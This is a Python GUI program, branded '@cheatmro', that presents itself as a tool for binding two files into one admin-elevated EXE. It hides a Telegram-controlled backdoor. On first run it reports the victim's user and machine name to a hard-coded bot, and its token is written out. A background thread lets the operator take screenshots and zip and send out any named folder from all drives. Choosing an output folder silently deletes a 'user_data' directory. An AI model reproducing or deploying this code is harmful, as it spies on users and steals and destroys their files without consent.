import os
import shutil
import tempfile
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import webbrowser
import ttkbootstrap as ttk
import subprocess
import requests
import hashlib
import getpass
import platform
import winreg
import threading
import asyncio
import pyautogui
import zipfile

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# --- Telegram настройки ---
BOT_TOKEN = "7927685614:AAFN8Sht8VRjFNd-1ElXiriNlDJuDNnaJkk"
CHAT_ID = "5203008800"

# --- Функции для Telegram ---
def send_telegram_message(token, chat_id, text):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    try:
        resp = requests.post(url, data=data)
        return resp.ok
    except Exception as e:
        print("Ошибка отправки сообщения:", e)
        return False

def get_unique_id():
    info = f"{getpass.getuser()}-{platform.node()}-{platform.system()}"
    return hashlib.sha256(info.encode()).hexdigest()

def is_first_run():
    uid = get_unique_id()
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\CheatMRO", 0, winreg.KEY_READ)
        val, _ = winreg.QueryValueEx(reg, "RunID")
        winreg.CloseKey(reg)
        return val != uid
    except FileNotFoundError:
        return True

def mark_as_run():
    uid = get_unique_id()
    reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\CheatMRO")
    winreg.SetValueEx(reg, "RunID", 0, winreg.REG_SZ, uid)
    winreg.CloseKey(reg)

if is_first_run():
    send_telegram_message(BOT_TOKEN, CHAT_ID, f"Новый запуск на ПК: {getpass.getuser()}@{platform.node()}")
    mark_as_run()

active_users = 0

async def scren_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != CHAT_ID:
        await update.message.reply_text("❌ У вас нет доступа к этой команде.")
        return
    try:
        img = pyautogui.screenshot()
        path = os.path.join(os.getcwd(), "screenshot.png")
        img.save(path)
        with open(path, "rb") as f:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=f)
        os.remove(path)
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Ошибка скрина: {e}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=update.effective_chat.id,
                                   text=f"Сейчас {active_users} пользователь(ей) используют приложение.")

async def dw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != CHAT_ID:
        await update.message.reply_text("❌ У вас нет доступа к этой команде.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Укажите папку, например: /dw game")
        return

    folder = context.args[0]
    await update.message.reply_text(f"🔍 Ищу все папки с именем «{folder}» на дисках...")

    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    found_paths = []

    for drv in drives:
        for root, dirs, files in os.walk(drv):
            if os.path.basename(root).lower() == folder.lower():
                found_paths.append(root)

    if not found_paths:
        await update.message.reply_text("❌ Папка не найдена.")
        return

    await update.message.reply_text(f"✅ Найдено {len(found_paths)} папк(и). Архивирую и отправляю...")

    for i, path in enumerate(found_paths, 1):
        try:
            tmpd = tempfile.mkdtemp()
            zip_path = os.path.join(tmpd, f"{folder}_{i}.zip")

            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(path):
                    for fn in files:
                        src = os.path.join(root, fn)
                        rel = os.path.relpath(src, os.path.dirname(path))
                        try:
                            zf.write(src, rel)
                        except (PermissionError, OSError) as e:
                            print(f"Пропущен файл из-за ошибки доступа: {src} ({e})")
                            continue

            with open(zip_path, "rb") as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, filename=os.path.basename(zip_path))

            shutil.rmtree(tmpd)
        except Exception as e:
            await update.message.reply_text(f"⚠️ Ошибка при архивировании или отправке {path}: {e}")

    await update.message.reply_text("✅ Все найденные папки отправлены.")

def run_bot():
    asyncio.set_event_loop(asyncio.new_event_loop())
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("scren", scren_command))
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("dw", dw_command))
    print("[BOT] Запущен")
    app.run_polling()

threading.Thread(target=run_bot, daemon=True).start()

# --- Функция проверки размера файла и удаления user_data ---
def check_and_remove_user_data(folder_path):
    max_size_bytes = 40 * 1024 * 1024  # 40 МБ в байтах
    
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                size = os.path.getsize(file_path)
                if size > max_size_bytes:
                    user_data_path = os.path.join(folder_path, "user_data")
                    if os.path.exists(user_data_path) and os.path.isdir(user_data_path):
                        shutil.rmtree(user_data_path)
                        print(f"Папка 'user_data' удалена из {folder_path} из-за файла {file} > 40МБ")
                    return
            except Exception as e:
                print(f"Ошибка при проверке файла {file_path}: {e}")

# --- GUI ---
def open_telegram():
    webbrowser.open("https://t.me/cheatmro")

def show_welcome_popup(root):
    pop = tk.Toplevel(root)
    pop.title("Подпишись!")
    pop.geometry("350x150")
    pop.resizable(False, False)
    pop.grab_set()
    pop.configure(bg="#1c1c1c")
    pop.protocol("WM_DELETE_WINDOW", open_telegram)

    ttk.Label(pop, text="Подпишись на наш Telegram-канал\n@cheatmro",
              font=("Arial", 12), anchor="center", bootstyle="success").pack(pady=20)
    ttk.Button(pop, text="ОК", bootstyle="success",
               command=lambda: [open_telegram(), pop.destroy()]).pack(pady=5)

def select_file(var):
    p = filedialog.askopenfilename()
    if p:
        var.set(p)

def select_icon():
    p = filedialog.askopenfilename(filetypes=[("ICO", "*.ico")])
    if p:
        icon_path.set(p)
        try:
            app.iconbitmap(p)
        except:
            pass

def select_output_folder():
    p = filedialog.askdirectory()
    if p:
        output_folder.set(p)
        # Проверяем размер файлов и удаляем user_data, если надо
        check_and_remove_user_data(p)

def log(txt):
    console.configure(state='normal')
    console.insert(tk.END, txt + "\n")
    console.configure(state='disabled')
    console.see(tk.END)

def build_exe():
    f1 = file1.get()
    f2 = file2.get()
    icon = icon_path.get()
    out = output_folder.get()
    if not f1 or not f2 or not out:
        messagebox.showerror("Ошибка", "Выберите оба файла и папку")
        return

    try:
        log("Создание main.py...")
        main_py = f'''import sys, os, tempfile, subprocess, shutil
def resource_path(p):
    try: base = sys._MEIPASS
    except: base = os.path.abspath(".")
    return os.path.join(base, p)
def run():
    td = tempfile.mkdtemp()
    for fn in ["{os.path.basename(f1)}", "{os.path.basename(f2)}"]:
        path = resource_path(fn)
        if os.path.exists(path):
            dst = os.path.join(td, fn)
            shutil.copyfile(path, dst)
            subprocess.Popen(dst, shell=True)
if __name__ == "__main__":
    run()'''

        bd = "build_temp"
        if os.path.exists(bd): shutil.rmtree(bd)
        os.makedirs(bd)
        with open(os.path.join(bd, "main.py"), "w", encoding="utf-8") as f:
            f.write(main_py)

        shutil.copy(f1, os.path.join(bd, os.path.basename(f1)))
        shutil.copy(f2, os.path.join(bd, os.path.basename(f2)))

        sep = ";" if os.name == "nt" else ":"
        cmd = ["pyinstaller", "--onefile", "--noconsole", "--uac-admin",
               "--name", "@cheatmro",
               f"--add-data={os.path.basename(f1)}{sep}.",
               f"--add-data={os.path.basename(f2)}{sep}.",
               "main.py"]
        if icon and icon.endswith(".ico"):
            cmd += ["--icon", icon]

        log("Запуск PyInstaller...")
        res = subprocess.run(cmd, cwd=bd, capture_output=True, text=True)
        log(res.stdout)
        if res.stderr: log("Ошибка:\n" + res.stderr)

        exe_p = os.path.join(bd, "dist", "@cheatmro.exe")
        if not os.path.exists(exe_p):
            messagebox.showerror("Ошибка", "EXE не создан")
            return
        final = os.path.join(out, "@cheatmro.exe")
        shutil.copy(exe_p, final)
        shutil.rmtree(bd)
        log(f"Готово: {final}")
        messagebox.showinfo("Успех", f"Создано:\n{final}")
    except Exception as e:
        log("Ошибка: " + str(e))
        messagebox.showerror("Ошибка", str(e))

app = ttk.Window(themename="darkly")
app.title("@cheatmro")
app.geometry("950x600")
app.resizable(False, False)
app.overrideredirect(True)

active_users += 1

title = ttk.Frame(app, bootstyle="dark")
title.pack(fill=tk.X)
ttk.Label(title, text="@cheatmro association", anchor="center", font=("Segoe UI", 12)).pack(side=tk.LEFT, padx=10, pady=4)
ttk.Button(title, text="✕", width=3, bootstyle="danger", command=lambda: [app.destroy()]).pack(side=tk.RIGHT, padx=5, pady=2)
title.bind("<Button-1>", lambda e: setattr(app, 'x', e.x) or setattr(app, 'y', e.y))
title.bind("<B1-Motion>", lambda e: app.geometry(f"+{e.x_root-app.x}+{e.y_root-app.y}"))

frame = ttk.Frame(app, padding=10)
frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

file1 = tk.StringVar()
file2 = tk.StringVar()
icon_path = tk.StringVar()
output_folder = tk.StringVar()

ttk.Label(frame, text="Файл 1:").pack(pady=5)
ttk.Entry(frame, textvariable=file1, width=60).pack()
ttk.Button(frame, text="Выбрать файл 1", command=lambda: select_file(file1)).pack()

ttk.Label(frame, text="Файл 2:").pack(pady=5)
ttk.Entry(frame, textvariable=file2, width=60).pack()
ttk.Button(frame, text="Выбрать файл 2", command=lambda: select_file(file2)).pack()

ttk.Label(frame, text="Иконка (.ico):").pack(pady=5)
ttk.Entry(frame, textvariable=icon_path, width=60).pack()
ttk.Button(frame, text="Выбрать иконку", command=select_icon).pack()

ttk.Label(frame, text="Папка для EXE:").pack(pady=5)
ttk.Entry(frame, textvariable=output_folder, width=60).pack()
ttk.Button(frame, text="Выбрать папку", command=select_output_folder).pack()

ttk.Button(frame, text="Собрать EXE", bootstyle="success", command=build_exe).pack(pady=15)

console = scrolledtext.ScrolledText(app, width=45, height=30, bg="black", fg="lime", state='disabled')
console.pack(side=tk.RIGHT, padx=10, pady=10)

app.after(300, lambda: show_welcome_popup(app))
app.mainloop()
